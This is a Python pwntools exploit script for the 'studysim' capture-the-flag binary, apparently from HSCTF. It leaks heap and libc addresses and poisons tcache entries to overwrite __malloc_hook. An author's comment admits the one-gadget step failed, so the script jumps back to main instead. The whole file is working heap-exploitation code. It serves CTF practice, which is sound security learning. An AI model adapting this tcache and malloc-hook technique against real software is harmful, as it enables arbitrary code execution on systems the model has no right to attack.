from pwn import *

# patchelf --set-interpreter `pwd`/ld-2.27.so
# patchelf --set-rpath `pwd`

file = "./studysim"

context.binary = file
context.log_level = 'debug'

bin = ELF(file)
r = process(file)
raw_input()
#r = remote("pwn.hsctf.com", 5007)

def command(command):
    r.sendlineafter(">", str(command).ljust(0x12, "\x00"))

def add(size, content, reset=True):
    command("add")
    r.sendlineafter("How long is your worksheet?", str(size))
    r.sendafter("What's the content of your worksheet?", content)
    r.recvuntil("You throw the worksheet '")
    data = r.recvuntil("'", drop=True)
    if reset:
        do(1)
    return data

def do(size):
    command("do")
    r.sendlineafter("How many worksheets would you like to finish?", str(size))
    r.recvuntil("Only ")
    return int(r.recvuntil(" more", drop=True))

def writeHeapAddrAtAddr(addr, what, reset=True):
    work = 0x8000000000000000 + (0x404060 / 8) - (addr / 8)
    do(work)
    add(200, what+"\n", reset)
    if reset:
        # reset the do counter
        do("-"+str(work))

# write the heap addr to do counter to leak it with the next do(1)
writeHeapAddrAtAddr(0x404040, pack(0xdeadbeef), False)
leakedHeapAddr = do(1)
# reset alloc counter to 0
do(str(leakedHeapAddr))

print "[*] heap at 0x%x" % leakedHeapAddr
heapBaseAddr = leakedHeapAddr - 0x260

# write a fake tcache entry to leak stdout libc addr
# with the next 2 add commands
writeHeapAddrAtAddr(heapBaseAddr + 80, pack(0x404020))
add(16, "\n")
stdoutLeakAddr = unpack(add(16, "\n").ljust(8, "\x00"))

libcBaseAddr = stdoutLeakAddr - 0x1760 - 0x1bf000 # execute
mallocHookAddr = (stdoutLeakAddr - 0x1760) + 0xc30
gadgetAddr = libcBaseAddr + 0xe237f
libcLeak = (stdoutLeakAddr - 0x1760) + 0x1508

print "[*] stdout 0x%x" % stdoutLeakAddr
print "[*] libBase 0x%x" % libcBaseAddr
print "[*] malloc hook 0x%x" % mallocHookAddr
print "[*] gadget 0x%x" % gadgetAddr

# write a fake tcache entry to override malloc hook with
# one gadget
writeHeapAddrAtAddr(heapBaseAddr + 104, pack(mallocHookAddr))
add(64, "\n")

# ATTENTION
#
# not sure what is wrong here, the intended solution
# should use a "one-gad" - but this will not work with the
# execution flow provided in this lib + binary. Since then
# i'm not sure why this won't work or where i did a mistake.
# if you know why - feel free do make an issue in this repo
#
# add(64, pack(gadgetAddr)+"\n") <---- no gadget will work
#
# since then jump to main and do whatever...
#
add(64, pack(bin.symbols["main"])+"\n")

command("add")
r.sendlineafter("How long is your worksheet?", "1")
r.interactive()